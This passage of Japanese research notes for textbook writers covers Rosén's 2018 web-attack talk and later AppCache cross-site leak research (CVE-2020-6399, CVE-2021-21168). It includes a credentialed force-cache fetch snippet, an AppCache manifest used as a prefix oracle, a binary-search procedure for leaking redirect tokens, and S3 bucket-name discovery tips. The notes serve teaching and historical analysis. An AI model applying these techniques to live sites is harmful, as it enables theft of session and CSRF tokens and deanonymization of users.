  - `https://www.facebook.com/a* isPattern` でネットワークエラー→1文字目は `a` ではない。`v*` で成功→1文字目は `v`。
  - 1マニフェストに文字集合の半分（例 `a*`〜`m*`）を並べれば**二分探索**でき、1文字あたりの試行を対数に削減。以降の文字は確定済みプレフィクスに追記して同様に反復。
- 影響が大きいシナリオ（逐語列挙）: クエリ文字列に**セッショントークン**を含むリダイレクト / **CSRFトークン**を含むリダイレクト / 機密情報（非公開ドキュメント・写真等）へのリダイレクト / ユーザーのプロフィールへのリダイレクト（**deanonymization**）。

### (6) 実証時の障害と回避: `cache: "force-cache"` でローテーションするトークンを凍結する

実標的として Chromiumのissue tracker `https://bugs.chromium.org/p/chromium/issues/entryafterlogin`（認証後に報告フォームへリダイレクトする）を選んだが、**リクエストごとに新しいCSRFトークンが生成されリダイレクト先が変わる**ため、複数リクエストを要する攻撃が成立しない。

解決: レスポンスの `Cache-Control` が `private` だったため、`force-cache` でレスポンス（**`Location` ヘッダごと**）をキャッシュし、以降はキャッシュから読ませてリダイレクト先URL＝CSRFトークンを**凍結**した。

```javascript
fetch("https://bugs.chromium.org/p/chromium/issues/entryafterlogin", {
    mode: "no-cors",
    credentials: "include",
    cache: "force-cache"
});
```

- 〔教科書向けの一般化〕「トークンがローテーションするから多段リークは無理」という直感は、**HTTPキャッシュでレスポンスを固定できる場合には成り立たない**。クライアントサイドのオラクル攻撃では `cache:` オプションが攻撃の可用性を左右する。

### (7) 後日談: 仕様側の欠陥（プレフィクス照合）で再度成立

約1年後、`isPattern` 抜きでも**AppCache仕様がURLをプレフィクスで照合する**欠陥により同じ攻撃が再成立することを発見:

```text
CACHE MANIFEST

NETWORK:
https://facebook.com/me
https://facebook.com/v
```
- このマニフェスト下では `https://facebook.com/v`、`/vi`、`/vic`、`/vict`、`/victi`、`/victim` すべてが許可され、`/anothervictim` は拒否される＝**プレフィクス一致がそのままオラクルになる**。
- Firefoxはかつて脆弱だったが、既にAppCacheをデフォルト無効化していた（再有効化にはフラグが必要）。
- PoC全体: `https://gist.github.com/lbherrera/6e549dcf49334b637c22d76518a90ff6`
- **報奨**: Chrome VRPへの2件（バグ報告 `1039869` を含む。1件目は7日で修正）で **CVE-2020-6399** と **CVE-2021-21168**、合計 **$10,000**。

### (8) 本トークとの接続（教科書での使い方）

| 観点 | Rosén 2018（本トーク） | Herrera 2020-2021（追補5） |
| --- | --- | --- |
| 悪用セクション | **FALLBACK**（same-origin限定） | **NETWORK**（＋CACHE）でクロスオリジン |
| 前提 | サンドボックスドメインに攻撃者HTMLを置ける | 攻撃者サイトにマニフェストを置くだけ |
| 効果 | オリジン全体の乗っ取り・秘密リンク漏洩（完全性の侵害） | リダイレクトURLの文字単位リーク（機密性の侵害・XS-Leak） |
| 発火装置 | Cookie爆撃で全ページ500化 | `applicationCache` のイベント／`fetch` のreject |
| 結末 | 全ブラウザ修正＋AppCache廃止の加速を主張 | AppCacheがChrome 93で完全削除され決着 |

→ 「Rosénがトークで **"Argumented for faster deprecation of AppCache"（AppCacheの早期廃止を主張した）"** と述べたこと（本文スライド21-23）が、実際にChrome 67→70→85→93という廃止プロセスに結実し、その最後の局面でHerreraが仕様レベルの欠陥をさらに掘った」という流れで、AppCache章を歴史的に締められる。

---

## 追補6: Upload Policies章への補足 — 同日のRosén本人ツイート（S3バケット名の発見手法）

出典: `parasg1999/Tweet-dataset` `tweets/fransrosen.csv`（Frans Rosén本人、**AppSecEU登壇当日 Fri Jul 06 2018**、17:34〜17:38 UTC の連続ツイート。同じCSV内の直前後に `@Nirgoldshlager @AppSecEU thanks Nir! :)` 等の登壇直後の謝辞が並んでおり、登壇当日の投稿であることが分かる）。ツイートは短縮URLで途中が省略されているため、**以下は原文のまま（末尾が `…` で切れている）引用する**:

> 「I read the S3-docs and found that **signing-errors disclosed the bucket-name**. This can be used when CDNs are put in f…」（17:34:47）

> 「Many of the times, a specific path (**/files/, /static/ etc**) is used as a **reverse proxy to S3**, this script will to de…」（17:37:39）

> 「The reason to find the bucket is to make further **ACL-checks on the bucket**. When the bucket is hidden behind a CDN,…」（17:38:07）

**読み取れること（過剰解釈を避けた範囲）**:
- 本トークのUpload Policies系統（スライド26-54）は「署名ポリシーの弱い実装」を扱うが、その**前段**として「そもそもバケット名をどう見つけるか」という問題があり、Rosénは登壇当日にその手法を共有していた。
- 手法の骨子: ①S3の**署名エラーメッセージがバケット名を開示する**性質を利用する ②`/files/`・`/static/` のようなパスがS3へのリバースプロキシになっている構成が多く、CDN背後に隠れたバケットでもこの方法で特定できる ③バケット名を得る目的は、そのバケットに対して**さらにACLチェックを行う**ため。
- **注意**: ツイートは途中で切れており、言及されている「this script」の正体は本セッションでは確認できていない（短縮URL `t.co` の解決にはTwitterへの到達が必要で、ブロックされている）。教科書に書く際は「Rosénは署名エラーによるバケット名開示を利用する手法をトーク当日に共有していた」という事実に留め、スクリプト名や詳細手順を補ってはならない。
- 本ノート本文スライド44-47の〔補足〕（virtual-hosted styleとpath styleの差異でURL抽出正規表現が破綻する話）と主題が接続する。

---

## 追補7: 関連するRosénのpostMessage報告（参考・トーク本体とは別件）

出典: `Didericis/twitter-rumor-spreader` `api/server/data/fransrosen.json`（ツイートID 902553768285364225、`@brutelogic`）:

> 「#XSS with postMessage frame-jumping and jQuery-JSONP https://hackerone.com/reports/207042 Another @fransrosen masterpiece! Simply awesome!」

- HackerOne report **207042**（公開）。「postMessageによるframe-jumping＋jQuery-JSONP」でのXSS。
- **本トークのスライドには登場しない**（追補2のキーワード検証で `jsonp` = 0件）。本トークと同時期・同テーマのRosénの公開報告として、postMessage章の追加演習素材になる。トークの内容として書いてはならない。

---

## 追補8: 読者が自分で開くべき資料（追補版 — 具体的な参照位置つき）

本文の「## 読者が自分で開くべき資料」を置き換えるものではなく、**再取得試行で判明した具体的な手がかりを追加**する。

### 動画（取得不能が確定）

| 版 | URL | 尺 | 備考 |
| --- | --- | --- | --- |
| NDC Oslo 2018（担当URL） | `https://www.youtube.com/watch?v=vRqcUS4CPFs` | **54:58** | 追補1(a)(b)で同定を裏付け済み |
| OWASP AppSec Europe 2018 | `https://www.youtube.com/watch?v=oJCCOnF25JU` | — | **原著者本人のREADMEが挙げる版**。こちらを推奨 |
| （未検証の異説） | `https://www.youtube.com/watch?v=vMGiplQT9Qo` | — | 第三者まとめ由来。真偽未確認 |

**なぜ自動取得できないか（確定）**: YouTube本体・字幕API・archive.org・各種テキスト抽出プロキシのすべてが、このセッションのegressポリシーで **403（組織のポリシー拒否）**。リモート側の障害ではないため、時間を置いた再試行でも解決しない。読者自身のブラウザからは通常どおり視聴できる。

**ピンポイントの参照位置（新規に判明）**:
- **postMessage系統の開始位置 = `https://youtu.be/oJCCOnF25JU?t=1094`（＝18分14秒）**。出典: `PelagusWallet/pelagus-extension` の `provider-bridge/README.md`（および同READMEを継承した `HassanKhan123/tally-ho`、`abhi152003/maxxo-wallet`）が、postMessageセキュリティの参考資料としてこのタイムスタンプ付きリンクを掲載している。つまり**実プロダクトの開発者が「postMessage実装の注意点はここから観ろ」と参照している箇所**であり、時間が限られている読者はここから観るのが最も費用対効果が高い。
- スライド対応で言えば、`t=1094` は本ノート本文の「### 第3系統: Deep dive in postMessage（スライド55-142）」の冒頭に対応する。

**この動画で何を学ぶために観るべきか**（本文の5項目に加えて）:
6. **スライドに載らなかったSlack事例の語り**: トーク告知文が予告した「postMessage＋WebSocket再接続でSlackトークンを奪う」話は**142枚のスライドPDFに1枚も存在しない**（追補2のキーワード検証で `slack`/`websocket` ともに0件）。したがってこの事例は**動画でしか聴けない口頭パート**である。文字面は本ノート「### 補完2」（Detectifyブログ全文）で代替済みなので、動画では「なぜこの順序で発見に至ったか」の語りに注目する。
7. **`isValidOrigin` の2つのバグをどう見つけたかの実演**: スライド104-111はコードと結果だけが載る。`.replace('.','\\.')` が1個しか置換しないことに気づく瞬間、`exampleaco.nz` を実際にドメイン登録しに行く判断、`.nz` が2015年から直接登録可能という知識の使い方は、口頭解説でしか追えない。

### 一次資料（追補で新たに判明した到達可能な代替）

- **AppCacheのその後（全文精読済み・本ノート追補5に収録）**: `https://blog.lbherrera.me/posts/appcache-forgotten-tales/`。原URLが開けない場合のミラー: `https://raw.githubusercontent.com/irsdl/webhacklist/HEAD/archived-references/md/2021/2021-blog-lbherrera-me-appcache-s-forgotten-tales.md`
- **スライド本文のGitHubミラー（speakerdeckが開けない読者向け）**: `https://raw.githubusercontent.com/irsdl/webhacklist/HEAD/archived-references/md/2018/2018-owasp-appsec-europe-attacking-modern-web-technologies-slides.md`（142枚の見出し＋図参照つき書き起こし）、および `https://raw.githubusercontent.com/hyr0ky/Hiroki_Study/HEAD/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/media/Appsec-Modern-copy.md`（同一PDFの別系統変換。本文テキストが密）。
- **原典PDF直リンク**: `https://speakerd.s3.amazonaws.com/presentations/ded93ff7934f4dfa9d76399b8dff2a16/Appsec-Modern-copy.pdf`（142ページ、約13MB）。
- **AppCacheのSecure Context化（スライド24の"recently"）**: `https://blog.mozilla.org/security/2018/02/12/restricting-appcache-secure-contexts/`
- **AppCache削除の公式案内**: `https://web.dev/appcache-removal/`、`https://www.chromestatus.com/feature/5714236168732672`、`https://www.w3.org/TR/html51/obsolete.html#application-caches`
- **Chrome独自のAppCache機能（CHROMIUM-INTERCEPT）**: `https://shhnjk.blogspot.com/2019/07/intro-to-chromes-gold-features.html`（Jun Kokatsu / @shhnjk）
- **AppCache XS-LeakのPoC**: `https://gist.github.com/lbherrera/6e549dcf49334b637c22d76518a90ff6`（CVE-2020-6399 / CVE-2021-21168）
- **共同報告者 Mathias Karlsson（@avlidienbrunn）の関連記事**: `https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/`（本ノート本文の関連資料欄にも既載。追補3により、AppCacheブラウザバグの共同報告者でもあることが判明した）
- **参考（トーク外のRosén報告）**: `https://hackerone.com/reports/207042`（postMessage frame-jumping + jQuery-JSONP XSS）、`https://hackerone.com/reports/207170`（Slack、本文補完2）

---

## 追補9: 教科書執筆者への注記（追補で確定・更新された点）

1. **範囲の確定**: 本トークの題材は **AppCache / Upload Policies(AWS S3・GCP) / postMessage（＋クライアントサイドレースコンディション）** の3系統で確定。当時の聴講者ツイート（追補2）とスライド第2ミラーのキーワード検証（`zendesk`/`prototype pollution`/`localStorage`/`websocket`/`slack` すべて0件）で**二重に裏付け済み**。Zendesk・prototype pollution・client-side storage は他の担当ノートから補うこと。
2. **クレジットの正確化**: AppCacheブラウザバグは **filedescriptor が独立発見**、**Rosén と Mathias Karlsson（@avlidienbrunn）が全ブラウザへ共同報告**（追補3。Chromiumバグ696806、報奨$3,000）。
3. **スライド24「HTTPS only (was changed recently)」の根拠**は Mozilla 2018-02-12 の AppCache Secure Context 制限（追補4）。年表として使える。
4. **AppCache章は追補5で「その後」まで書ける**: Chrome 67 deprecate → 70 非セキュア削除 → 85 デフォルト削除（82から延期）→ 93 完全削除。Rosénの「早期廃止を主張した」がこの流れに結実し、最終局面でHerreraがNETWORKセクションの許可リスト挙動・Chrome独自の `isPattern` glob・仕様のプレフィクス照合欠陥を突いてCVE 2件・$10,000。FALLBACKはsame-origin限定、NETWORKはクロスオリジンで効く、という対比が章の骨格に使える。
5. **Upload Policies章の前段**として「バケット名の発見（署名エラーによる開示、`/files/`・`/static/` リバースプロキシ、その後のACLチェック）」を追補6の範囲で触れられる。ただしツイートが途中で切れているため、スクリプト名・詳細手順を補完してはならない。
6. **動画は本セッションで取得不能が確定**。教科書では動画を「読者が自分で観る資料」として扱い、**postMessage系統は `https://youtu.be/oJCCOnF25JU?t=1094`（18:14）から** と案内するのが親切（追補8）。Slack事例は動画限定の口頭パートである。
7. **引用元の性質を明示すること**: 追補1・2・3・4・6・7のツイート引用は第三者のGitHub公開スクレイプ・データセット由来であり、Twitter本体で原文確認はしていない。複数データセットで一致したもの（追補2・3）は信頼度が高い。教科書で引用する場合は「当時のツイートより（第三者アーカイブ経由）」と注記するのが誠実。
